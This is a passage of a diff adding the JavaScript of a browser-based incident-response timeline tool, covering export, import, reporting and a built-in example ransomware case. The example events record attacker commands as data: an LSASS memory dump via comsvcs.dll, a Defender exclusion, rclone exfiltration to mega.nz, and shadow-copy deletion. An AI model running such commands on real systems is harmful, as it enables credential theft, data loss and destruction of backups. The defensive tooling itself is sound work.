+      (e.user?'<dt>Account</dt><dd><span class="usr">'+esc(e.user)+'</span>'+(e.priv?' <span class="prv">· '+esc(e.priv)+'</span>':'')+'</dd>':'')+
+      (e.technique?'<dt>Technique</dt><dd>'+esc(techLabel(e))+'</dd>':'')+
+      (e.indicator?'<dt>Indicator</dt><dd class="ind">'+(e.itype?'<span class="t">'+esc(e.itype)+'</span>':'')+esc(e.indicator)+'</dd>':'')+
+      (e.cmd?'<dt>Command</dt><dd><code class="cmd">'+esc(e.cmd)+'</code></dd>':'')+
+      (e.notes?'<dt>Notes</dt><dd class="wrap">'+esc(e.notes)+'</dd>':'')+
+      (e.source||e.link?'<dt>Source</dt><dd>'+esc(e.source||'')+(e.link?' <a class="src" href="'+attr(e.link)+'" target="_blank" rel="noopener">open record ↗</a>':'')+'</dd>':'')+
+      (e.evidence?'<dt>Evidence</dt><dd>'+esc(e.evidence)+'</dd>':'')+
+      (s.label?'<dt>Severity</dt><dd style="color:'+s.color+'">'+esc(s.label)+'</dd>':'')+
+      ((e.tags||[]).length?'<dt>Tags</dt><dd>'+e.tags.map(x=>'<span class="tag">'+esc(x)+'</span>').join('')+'</dd>':'')+
+    '</dl></div>';
+}
+/* ============================ FILE I/O ============================ */
+function download(name,text,mime){
+  const b=new Blob([text],{type:mime||'application/json;charset=utf-8'});
+  const u=URL.createObjectURL(b), a=document.createElement('a');
+  a.href=u; a.download=name; document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(()=>URL.revokeObjectURL(u),1500);
+}
+function slug(s){return (s||'case').toString().toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-|-$/g,'').slice(0,48)||'case';}
+function stamp(){const p=fmtParts(Date.now(),0);return p.date+'T'+p.time.replace(/:/g,'');}
+
+function exportJSON(){
+  S.case.modified=new Date().toISOString();
+  const out={schema:SCHEMA, generator:'BLACKBOX', exported:new Date().toISOString(),
+    case:S.case, hosts:S.hosts,
+    events:S.events.map(e=>{const c=Object.assign({},e);delete c.ep;return c;})};
+  download(slug(S.case.number||S.case.name)+'_'+stamp()+'.json', JSON.stringify(out,null,2));
+  dirty(false);
+  toast('Case file downloaded');
+}
+function importJSON(text,fileName){
+  let d;
+  try{ d=JSON.parse(text); }
+  catch(err){ toast('That file is not valid JSON','bad'); return; }
+  if(!d || !Array.isArray(d.events) || !Array.isArray(d.hosts)){
+    toast('No case data found — expected hosts and events arrays','bad'); return;
+  }
+  const apply=merge=>{
+    const norm=e=>Object.assign({id:uid('ev'),ts:'',off:0,hostId:'',srcHostId:'',user:'',priv:'',indicator:'',
+      itype:'',activity:'',cmd:'',tactic:'',technique:'',source:'',link:'',conf:'medium',sev:'medium',
+      key:false,tags:[],evidence:'',notes:''},e);
+    const nh=h=>Object.assign({id:uid('h'),name:'UNNAMED',ip:'',os:'',role:'',zone:'',crit:'moderate',
+      status:'unknown',owner:'',tags:[],notes:''},h);
+    if(merge){
+      const seenH={}; S.hosts.forEach(h=>seenH[h.id]=1);
+      const seenE={}; S.events.forEach(e=>seenE[e.id]=1);
+      d.hosts.forEach(h=>{const x=nh(h);if(!seenH[x.id])S.hosts.push(x);});
+      d.events.forEach(e=>{const x=norm(e);if(!seenE[x.id])S.events.push(x);});
+    }else{
+      S=blankCase();
+      S.case=Object.assign(S.case,d.case||{});
+      S.hosts=d.hosts.map(nh);
+      S.events=d.events.map(norm);
+    }
+    UI.sel=null; UI.expanded={};
+    decorate(); dirty(false); renderAll();
+    toast((merge?'Merged ':'Opened ')+d.events.length+' events from '+(fileName||'file'));
+  };
+  if(!S.events.length && !S.hosts.length){ apply(false); return; }
+  openModal(
+    '<div class="mhead"><h3>Open case file</h3></div>'+
+    '<div class="mbody"><p style="margin:0;line-height:1.7">This investigation already holds <b>'+S.events.length+
+    '</b> events across <b>'+S.hosts.length+'</b> hosts. The file you picked has <b>'+d.events.length+
+    '</b> events.</p><p style="color:var(--dim);margin:10px 0 0">Replacing discards what is on screen. '+
+    'Merging keeps both and skips anything with an ID you already have.</p></div>'+
+    '<div class="mfoot"><span class="sp"></span><button class="btn ghost" id="ixNo">Cancel</button>'+
+    '<button class="btn" id="ixMerge">Merge</button><button class="btn mag" id="ixRep">Replace</button></div>','narrow');
+  $('#ixNo').onclick=closeModal;
+  $('#ixMerge').onclick=()=>{closeModal();apply(true);};
+  $('#ixRep').onclick=()=>{closeModal();apply(false);};
+}
+
+function csvEscape(v){v=String(v==null?'':v);return /[",\n\r]/.test(v)?'"'+v.replace(/"/g,'""')+'"':v;}
+function exportCSV(){
+  const cols=['#','timestamp_utc','timestamp_source','source_tz','host','host_ip','pivot_from','account',
+    'privilege','tactic','technique','technique_name','activity','command','indicator_type','indicator',
+    'confidence','severity','key_event','data_source','link','evidence','tags','notes'];
+  const rows=[cols.join(',')];
+  filtered().forEach((e,i)=>{
+    const h=host(e.hostId), p=fmtParts(e.ep,+e.off||0);
+    rows.push([i+1, e.ts, p.date+' '+p.time, offsetLabel(+e.off||0), hostName(e.hostId), h?h.ip:'',
+      e.srcHostId?hostName(e.srcHostId):'', e.user, e.priv,
+      (TAC_BY_ID[e.tactic]||{}).name||'', e.technique, TECH_NAME[e.technique]||'',
+      e.activity, e.cmd, e.itype, e.indicator, e.conf, e.sev, e.key?'yes':'', e.source, e.link,
+      e.evidence, (e.tags||[]).join('|'), e.notes].map(csvEscape).join(','));
+  });
+  download(slug(S.case.number||S.case.name)+'_timeline_'+stamp()+'.csv', rows.join('\r\n'), 'text/csv;charset=utf-8');
+  toast('Timeline exported as CSV');
+}
+function exportIOCs(){
+  const idx=iocIndex(S.events);
+  const rows=['indicator,type,sightings,hosts,first_seen_utc,last_seen_utc'];
+  Object.keys(idx).forEach(k=>{
+    const g=idx[k], hs={}; g.events.forEach(e=>{if(e.hostId)hs[e.hostId]=1;});
+    const p1=fmtParts(g.events[0].ep,0), p2=fmtParts(g.events[g.events.length-1].ep,0);
+    rows.push([g.value,g.type||'',g.events.length,Object.keys(hs).map(hostName).join('|'),
+      p1.date+' '+p1.time,p2.date+' '+p2.time].map(csvEscape).join(','));
+  });
+  download(slug(S.case.number||S.case.name)+'_indicators_'+stamp()+'.csv', rows.join('\r\n'), 'text/csv;charset=utf-8');
+  toast('Indicator list exported');
+}
+
+function buildMarkdown(){
+  const c=S.case, m=reportModel(), L=[];
+  L.push('# '+(c.name||'Untitled investigation')+(c.number?' ('+c.number+')':''));
+  const head=[c.classification,c.analyst?'Lead analyst: '+c.analyst:'','Generated '+new Date().toISOString()].filter(Boolean);
+  L.push('',head.join(' · '),'');
+  L.push('## Summary','');
+  if(c.summary) L.push(c.summary,'');
+  L.push('- '+m.evs.length+' events across '+S.hosts.length+' hosts');
+  if(m.first) L.push('- First observed activity: `'+fmtTs(m.first,true)+'` on **'+hostName(m.first.hostId)+'**'+(m.first.activity?' — '+m.first.activity:''));
+  if(m.last) L.push('- Last observed activity: `'+fmtTs(m.last,true)+'` (span '+humanSpan(m.last.ep-m.first.ep)+')');
+  if(m.comp.length) L.push('- Confirmed compromised: '+m.comp.map(h=>h.name).join(', '));
+  L.push('- '+Object.keys(m.tech).length+' distinct ATT&CK techniques, '+Object.keys(m.iocs).length+' unique indicators','');
+  if(m.key.length){
+    L.push('## Key events','');
+    m.key.forEach(e=>L.push('- `'+fmtTs(e)+'` **'+hostName(e.hostId)+'** — '+(e.activity||e.indicator||'')+(e.technique?' ('+e.technique+')':'')));
+    L.push('');
+  }
+  if(S.hosts.length){
+    L.push('## Affected systems','','| Host | Address | Function | Status | Events | First seen | Last seen |','|---|---|---|---|---|---|---|');
+    S.hosts.forEach(h=>{const a=hostAgg(h.id);
+      L.push('| '+h.name+' | '+(h.ip||'—')+' | '+(h.role||'—')+' | '+((HS_BY_ID[h.status]||{}).label||'—')+' | '+a.count+
+        ' | '+(a.first?fmtParts(a.first,0).date+' '+fmtParts(a.first,0).time:'—')+
+        ' | '+(a.last?fmtParts(a.last,0).date+' '+fmtParts(a.last,0).time:'—')+' |');});
+    L.push('');
+  }
+  L.push('## Timeline','','| Time | Host | Account | Technique | Activity | Confidence |','|---|---|---|---|---|---|');
+  m.evs.forEach(e=>{
+    const act=(e.activity||'—')+(e.cmd?'<br>`'+e.cmd.replace(/\s+/g,' ').replace(/\|/g,'\\|').slice(0,180)+'`':'');
+    L.push('| '+fmtTs(e)+' | '+hostName(e.hostId)+(e.srcHostId?' ← '+hostName(e.srcHostId):'')+
+      ' | '+(e.user||'—')+(e.priv?' ('+e.priv+')':'')+' | '+(e.technique||'—')+
+      ' | '+act.replace(/\|/g,'\\|')+' | '+((CONF_BY_ID[e.conf]||{}).label||'—')+' |');
+  });
+  L.push('');
+  const ik=Object.keys(m.iocs);
+  if(ik.length){
+    L.push('## Indicators of compromise','','| Type | Indicator | Sightings | Hosts |','|---|---|---|---|');
+    ik.forEach(k=>{const g=m.iocs[k],hs={};g.events.forEach(e=>{if(e.hostId)hs[e.hostId]=1;});
+      L.push('| '+(g.type||'—')+' | `'+g.value+'` | '+g.events.length+' | '+Object.keys(hs).map(hostName).join(', ')+' |');});
+    L.push('');
+  }
+  const tk=Object.keys(m.tech).sort();
+  if(tk.length){
+    L.push('## ATT&CK coverage','');
+    TACTICS.forEach(t=>{
+      const hit=t.tech.filter(p=>m.tech[p[0]]);
+      if(hit.length) L.push('- **'+t.name+'** — '+hit.map(p=>p[0]+' '+p[1]).join('; '));
+    });
+    L.push('');
+  }
+  return L.join('\n');
+}
+function exportMD(){
+  download(slug(S.case.number||S.case.name)+'_report_'+stamp()+'.md', buildMarkdown(), 'text/markdown;charset=utf-8');
+  toast('Report downloaded as Markdown');
+}
+
+/* ============================ EXAMPLE CASE ============================ */
+function loadDemo(){
+  const H=(id,name,ip,os,role,zone,status,crit,notes)=>({id:id,name:name,ip:ip,os:os,role:role,zone:zone,
+    status:status,crit:crit,owner:'',tags:[],notes:notes||''});
+  const hosts=[
+    H('h_wks','WKS-FIN-014','10.20.4.31','Windows 11 23H2','Finance workstation','Corp / VLAN 20','compromised','moderate','Patient zero. Imaged 2026-07-15, memory captured before shutdown.'),
+    H('h_file','SRV-FILE-02','10.20.9.10','Windows Server 2019','Departmental file server','Server / VLAN 90','compromised','high','Staging point for collection and exfiltration.'),
+    H('h_dc','DC-CORP-01','10.20.1.5','Windows Server 2022','Domain controller','Core / VLAN 10','compromised','crown jewel','DCSync observed. Full domain credential reset required.'),
+    H('h_bkp','SRV-BKP-01','10.20.9.44','Windows Server 2019','Backup server','Server / VLAN 90','compromised','crown jewel','Backup catalog deleted; offsite copies verified intact.'),
+    H('h_vpn','VPN-GW-01','172.16.0.2','FortiOS 7.2','Remote access gateway','Edge','clean','high','Reviewed — no evidence of attacker use.')
+  ];
+  const E=(ts,hostId,src,user,priv,act,cmd,itype,ind,tac,tech,source,conf,sev,key,notes)=>({
+    id:uid('ev'), ts:ts, off:0, hostId:hostId, srcHostId:src||'', user:user||'', priv:priv||'',
+    activity:act, cmd:cmd||'', itype:itype||'', indicator:ind||'', tactic:tac||'', technique:tech||'',
+    source:source||'', link:'', conf:conf||'high', sev:sev||'medium', key:!!key, tags:[], evidence:'', notes:notes||''});
+  const evs=[
+    E('2026-07-14T13:02:11Z','h_wks','','CORP\\j.reyes','standard user','Phishing email delivered with macro-enabled attachment',
+      '','sha256','9f2b1c7a44d3e5f6081a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70','TA0001','T1566.001','Email gateway','confirmed','high',true,
+      'Sender spoofed a known supplier domain. 3 other recipients did not open the file.'),
+    E('2026-07-14T13:11:47Z','h_wks','','CORP\\j.reyes','standard user','Macro executed, EXCEL.EXE spawned encoded PowerShell',
+      'powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A...','filename','Invoice_Q3_2026.xlsm','TA0002','T1059.001','EDR','confirmed','high',true,''),
+    E('2026-07-14T13:12:09Z','h_wks','','CORP\\j.reyes','standard user','First C2 beacon over HTTPS, 60s interval with jitter',
+      '','ip','185.243.115.44','TA0011','T1071.001','Zeek','confirmed','critical',true,
+      'Beacon persisted until containment at 17:58Z. JA3 matched a known commodity loader.'),
+    E('2026-07-14T13:14:52Z','h_wks','','CORP\\j.reyes','standard user','Local and domain reconnaissance',
+      'whoami /all\nnet group "domain admins" /domain\nnltest /domain_trusts','','','TA0007','T1087.002','Sysmon','confirmed','medium',false,''),
+    E('2026-07-14T13:26:30Z','h_wks','','CORP\\j.reyes','SYSTEM','LSASS memory dumped via signed binary proxy',
+      'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\ProgramData\\lsass.dmp full',
+      'filepath','C:\\ProgramData\\lsass.dmp','TA0006','T1003.001','EDR','confirmed','critical',true,
+      'UAC bypass preceded this at 13:24Z (fodhelper). svc_backup hash recovered from this dump.'),
+    E('2026-07-14T13:40:15Z','h_wks','','CORP\\j.reyes','local admin','Defender real-time protection exclusion added for C:\\ProgramData',
+      'powershell -c "Add-MpPreference -ExclusionPath C:\\ProgramData"','registry','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths','TA0005','T1562.001','Windows Event Log','confirmed','high',false,''),
+    E('2026-07-14T14:02:44Z','h_file','h_wks','CORP\\svc_backup','domain admin','Pass-the-hash authentication to admin share',
+      '','useraccount','CORP\\svc_backup','TA0008','T1550.002','Windows Event Log','confirmed','critical',true,
+      'Event 4624 logon type 3, NTLM, from 10.20.4.31. svc_backup was unnecessarily a Domain Admin.'),
+    E('2026-07-14T14:05:12Z','h_file','h_wks','CORP\\svc_backup','domain admin','Tooling copied to target over SMB',
+      'copy \\\\10.20.4.31\\C$\\ProgramData\\rc.exe C:\\Windows\\Temp\\rc.exe','filename','rclone.exe','TA0008','T1570','EDR','confirmed','high',false,''),
+    E('2026-07-14T14:31:58Z','h_dc','h_file','CORP\\svc_backup','domain admin','Kerberoasting — SPN ticket requests for 14 service accounts',
+      '','','','TA0006','T1558.003','Windows Event Log','high','high',false,'Event 4769 burst, RC4 encryption requested.'),
+    E('2026-07-14T15:10:03Z','h_dc','h_file','CORP\\svc_backup','domain admin','DCSync — directory replication of all domain secrets',
+      '','useraccount','CORP\\krbtgt','TA0006','T1003.006','Microsoft Sentinel','confirmed','critical',true,
+      'krbtgt hash must be reset twice. Treat the entire domain as compromised.'),
+    E('2026-07-14T15:44:21Z','h_file','','CORP\\svc_backup','domain admin','Finance share archived into staging directory',
+      '7z.exe a -mx1 -p C:\\Windows\\Temp\\arch.7z \\\\SRV-FILE-02\\finance\\*','filepath','C:\\Windows\\Temp\\arch.7z','TA0009','T1560.001','EDR','confirmed','high',true,
+      'Approximately 41 GB staged. Contents under review by Legal.'),
+    E('2026-07-14T16:20:37Z','h_file','','CORP\\svc_backup','domain admin','Archive transferred to cloud storage over TLS',
+      'rc.exe copy C:\\Windows\\Temp\\arch.7z remote:bk --transfers 8','domain','mega.nz','TA0010','T1567.002','Proxy','confirmed','critical',true,
+      '38.6 GB egress confirmed in proxy logs between 16:20Z and 17:02Z.'),
+    E('2026-07-14T17:02:55Z','h_bkp','h_file','CORP\\svc_backup','domain admin','Shadow copies deleted and backup services stopped',
+      'vssadmin.exe delete shadows /all /quiet\nnet stop "Veeam Backup Service" /y','','','TA0040','T1490','Windows Event Log','confirmed','critical',true,''),
+    E('2026-07-14T17:35:10Z','h_dc','','CORP\\svc_backup','domain admin','Ransomware staged for domain-wide deployment via new GPO',
+      '','filename','svchost32.exe','TA0040','T1486','Microsoft Sentinel','confirmed','critical',true,
+      'GPO "Windows Update Policy v2" created 17:33Z linked at domain root. Deleted before the scheduled 18:00Z execution.')
+  ];
+  S=blankCase();
+  S.case={name:'Operation Glasshouse', number:'IR-2026-0142', analyst:'J. Meyer',
+    classification:'TLP:AMBER+STRICT', summary:
+'Commodity loader delivered by phishing to a finance workstation on 14 July 2026. The operator dumped LSASS within 25 minutes, recovered credentials for an over-privileged backup service account, and used pass-the-hash to reach a file server and then the domain controller. DCSync gave them the full domain. Roughly 39 GB of finance data was staged and exfiltrated to cloud storage before backups were destroyed and ransomware was staged for domain-wide deployment. Containment cut C2 at 17:58Z, before encryption ran.\n\nThis is example data shipped with the tool — replace it with your own case.',
+    created:new Date().toISOString(), modified:new Date().toISOString()};
+  S.hosts=hosts; S.events=evs;
+  UI.sel=null; UI.expanded={};
+  dirty(false); renderAll();
+  toast('Example case loaded');
+}
+
+/* ============================ MENU / HELP ============================ */
+function openMenu(){
+  openModal(
+  '<div class="mhead"><h3>Case actions</h3><button class="btn sm ghost" id="mX">✕</button></div>'+
+  '<div class="mbody"><div class="grid2">'+
+    '<div><div class="sbtitle">This investigation</div>'+
+      '<button class="btn" style="width:100%;margin-bottom:6px" data-m="case">Edit case details</button>'+
+      '<button class="btn" style="width:100%;margin-bottom:6px" data-m="demo">Load example case</button>'+
+      '<button class="btn mag" style="width:100%" data-m="clear">Start a new empty case</button></div>'+
+    '<div><div class="sbtitle">Export</div>'+
+      '<button class="btn" style="width:100%;margin-bottom:6px" data-m="json">Case file (.json)</button>'+
+      '<button class="btn" style="width:100%;margin-bottom:6px" data-m="md">Report (.md)</button>'+
+      '<button class="btn" style="width:100%;margin-bottom:6px" data-m="csv">Timeline (.csv)</button>'+
+      '<button class="btn" style="width:100%" data-m="ioc">Indicator list (.csv)</button></div>'+
+  '</div>'+
+  '<div class="sbtitle" style="margin-top:18px">How this works</div>'+
+  '<p style="color:var(--dim);line-height:1.8;margin:0">'+
+  'Everything is held in this page and in the case file you download — no server, no storage, no network calls. '+
+  'Save the .json whenever you want to keep your work, and open it again to pick the investigation back up.<br><br>'+
+  '<b style="color:var(--ink)">Branch graph</b> — one lane per host, ordered by when the attacker first touched it. '+
+  'Node colour is the ATT&amp;CK tactic, the ring around it is the host. Set “Came from” on an event to draw a magenta '+
+  'branch showing the pivot between systems.<br><br>'+
+  '<b style="color:var(--ink)">Timestamps</b> — every event stores the source system’s timezone alongside UTC, so you can '+
+  'switch between UTC, your local time, and the time each source actually logged.<br><br>'+
+  '<b style="color:var(--ink)">Shortcuts</b> — <kbd>N</kbd> new event · <kbd>H</kbd> new host · <kbd>/</kbd> search · '+
+  '<kbd>Ctrl</kbd>+<kbd>S</kbd> save case file · <kbd>Esc</kbd> close'+
+  '</p></div>'+
+  '<div class="mfoot"><span class="sp"></span><button class="btn pri" id="mClose">Done</button></div>');
+  $('#mX').onclick=closeModal; $('#mClose').onclick=closeModal;
+  $('#modalRoot').addEventListener('click',ev=>{
+    const b=ev.target.closest('[data-m]'); if(!b) return;
+    const m=b.dataset.m; closeModal();
+    if(m==='case') editCase();
+    else if(m==='demo'){ if(S.events.length) confirmBox('Load example case','This replaces the current investigation. Any unsaved work is lost.','Load example',loadDemo,true); else loadDemo(); }
+    else if(m==='clear') confirmBox('Start a new case','This clears all hosts and events. Save your case file first if you need it.','Clear everything',()=>{
+        S=blankCase();UI.sel=null;UI.expanded={};dirty(false);renderAll();toast('New case started');},true);
+    else if(m==='json') exportJSON();
+    else if(m==='md') exportMD();
+    else if(m==='csv') exportCSV();
+    else if(m==='ioc') exportIOCs();
+  });
+}
+
+/* ============================ WIRING ============================ */
+function refreshDatalists(){
+  const users={},types={},srcs={};
+  S.events.forEach(e=>{if(e.user)users[e.user]=1;if(e.itype)types[e.itype]=1;if(e.source)srcs[e.source]=1;});
+  IOC_TYPES.forEach(t=>types[t]=1); DATA_SOURCES.forEach(s=>srcs[s]=1);
+  const mk=(id,list)=>'<datalist id="'+id+'">'+list.map(v=>'<option value="'+attr(v)+'"></option>').join('')+'</datalist>';
+  let d=$('#dls');
+  if(!d){d=document.createElement('div');d.id='dls';document.body.appendChild(d);}
+  d.innerHTML=mk('dlUsers',Object.keys(users).sort())+mk('dlPriv',PRIVS)+
+              mk('dlIoc',Object.keys(types).sort())+mk('dlSrc',Object.keys(srcs).sort());
+}
+
+function setView(v){
+  UI.view=v;
+  $$('.tab').forEach(t=>t.classList.toggle('on',t.dataset.view===v));
+  $$('.view').forEach(s=>s.classList.toggle('on',s.id==='view-'+v));
+  $('#viewport').scrollTop=0;
+  renderAll();
+}
+function selectEvent(id){
+  UI.sel = UI.sel===id ? null : id;
+  const vp=$('#viewport'), st=vp.scrollTop, sl=vp.scrollLeft;
+  renderAll();
+  vp.scrollTop=st; vp.scrollLeft=sl;
+}
+function keepScroll(fn){
+  const vp=$('#viewport'), st=vp.scrollTop, sl=vp.scrollLeft;
+  fn();
+  vp.scrollTop=st; vp.scrollLeft=sl;
+}
+
+function wire(){
+  /* top bar */
+  $('#btnNewEvent').onclick=()=>editEvent(null);
+  $('#btnNewHost').onclick=()=>editHost(null);
+  $('#btnExport').onclick=exportJSON;
+  $('#btnMenu').onclick=openMenu;
+  $('#btnImport').onclick=()=>$('#fileInput').click();
+  $('#fileInput').onchange=ev=>{
+    const f=ev.target.files&&ev.target.files[0]; if(!f) return;
+    const r=new FileReader();
+    r.onload=()=>importJSON(String(r.result),f.name);
+    r.onerror=()=>toast('Could not read that file','bad');
+    r.readAsText(f);
+    ev.target.value='';
+  };
+  $('#caseName').oninput=e=>{S.case.name=e.target.value;dirty();};
+  $('#caseNumber').oninput=e=>{S.case.number=e.target.value;dirty();};
+  $('#sbToggle').onclick=()=>document.body.classList.toggle('sbopen');
+
+  /* tabs */
+  $$('.tab').forEach(t=>t.onclick=()=>setView(t.dataset.view));
+
+  /* filters */
+  let t=null;
+  $('#fSearch').oninput=e=>{clearTimeout(t);t=setTimeout(()=>{UI.filters.q=e.target.value;renderAll();},180);};
+  $('#fHost').onchange=e=>{UI.filters.host=e.target.value;renderAll();};
+  $('#fUser').onchange=e=>{UI.filters.user=e.target.value;renderAll();};
+  $('#fTactic').onchange=e=>{UI.filters.tactic=e.target.value;renderAll();};
+  $('#fFrom').onchange=e=>{UI.filters.from=e.target.value;renderAll();};
+  $('#fTo').onchange=e=>{UI.filters.to=e.target.value;renderAll();};
+  $('#fTz').onchange=e=>{UI.tz=e.target.value;renderAll();};
+  $('#btnClearFilters').onclick=()=>{
+    UI.filters={q:'',host:'',user:'',tactic:'',conf:[],flags:[],from:'',to:''};
+    $('#fSearch').value='';$('#fFrom').value='';$('#fTo').value='';
+    renderAll();
+  };
+  $('#sidebar').addEventListener('click',ev=>{
+    const c=ev.target.closest('.fchip'); if(!c) return;
+    const arr = c.dataset.conf ? UI.filters.conf : UI.filters.flags;
+    const key = c.dataset.conf || c.dataset.flag;
+    const i=arr.indexOf(key); if(i<0) arr.push(key); else arr.splice(i,1);
+    renderAll();
+  });
+
+  /* main viewport delegation */
+  $('#viewport').addEventListener('click',ev=>{
+    if(ev.target.closest('a')) return;
+    const act=ev.target.closest('[data-act]');
+    if(act){
+      const a=act.dataset.act;
+      if(a==='new') editEvent(null);
+      else if(a==='newhost') editHost(null);
+      else if(a==='edit'){ const row=act.closest('[data-id]'); editEvent(act.dataset.id||(row&&row.dataset.id)); }
+      else if(a==='close'){ UI.sel=null; keepScroll(renderAll); }
+      else if(a==='csv') exportCSV();
+      else if(a==='ioccsv') exportIOCs();
+      else if(a==='md') exportMD();
+      else if(a==='case') editCase();
+      else if(a==='print') window.print();
+      else if(a==='clearf') $('#btnClearFilters').click();
+      else if(a==='demo') loadDemo();
+      return;
+    }
+    const g=ev.target.closest('[data-g]');
+    if(g){ UI.gmode=g.dataset.g; renderAll(); return; }
+    const mx=ev.target.closest('[data-mx]');
+    if(mx){ UI.matrixOnly=mx.dataset.mx==='1'; renderAll(); return; }
+    const ex=ev.target.closest('[data-exp]');
+    if(ex){ UI.expanded={}; if(ex.dataset.exp==='1') filtered().forEach(e=>UI.expanded[e.id]=1); renderAll(); return; }
+    const hc=ev.target.closest('[data-host]');
+    if(hc){ editHost(hc.dataset.host); return; }
+    const ic=ev.target.closest('[data-ioc]');
+    if(ic){ const k='ioc:'+ic.dataset.ioc;
+      if(UI.expanded[k]) delete UI.expanded[k]; else UI.expanded[k]=1;
+      keepScroll(renderAll); return; }
+    const row=ev.target.closest('[data-id]');
+    if(row){
+      const id=row.dataset.id;
+      if(UI.view==='timeline'){ if(UI.expanded[id]) delete UI.expanded[id]; else UI.expanded[id]=1; UI.sel=id; keepScroll(renderAll); }
+      else selectEvent(id);
+    }
+  });
+  $('#viewport').addEventListener('dblclick',ev=>{
+    const row=ev.target.closest('[data-id]');
+    if(row&&!ev.target.closest('a')) editEvent(row.dataset.id);
+  });
+  document.addEventListener('change',ev=>{
+    if(ev.target.id==='gAll'){ UI.laneAll=ev.target.checked; renderAll(); }
+  });
+
+  /* keyboard */
+  document.addEventListener('keydown',ev=>{
+    if(ev.key==='Escape'&&onEsc){ onEsc(); return; }
+    if((ev.ctrlKey||ev.metaKey)&&ev.key.toLowerCase()==='s'){ ev.preventDefault(); exportJSON(); return; }
+    const tag=(ev.target.tagName||'').toLowerCase();
+    if(tag==='input'||tag==='textarea'||tag==='select'||ev.target.isContentEditable) return;
+    if(ev.ctrlKey||ev.metaKey||ev.altKey) return;
+    if(ev.key==='/'){ ev.preventDefault(); document.body.classList.add('sbopen'); $('#fSearch').focus(); }
+    else if(ev.key.toLowerCase()==='n'){ ev.preventDefault(); editEvent(null); }
+    else if(ev.key.toLowerCase()==='h'){ ev.preventDefault(); editHost(null); }
+  });
+
+  window.addEventListener('beforeunload',ev=>{
+    if(!UI.dirty) return;
+    ev.preventDefault(); ev.returnValue='';
+  });
+}
+
+/* ============================ START ============================ */
+wire();
+renderAll();
+</script>
+</body>
+</html>
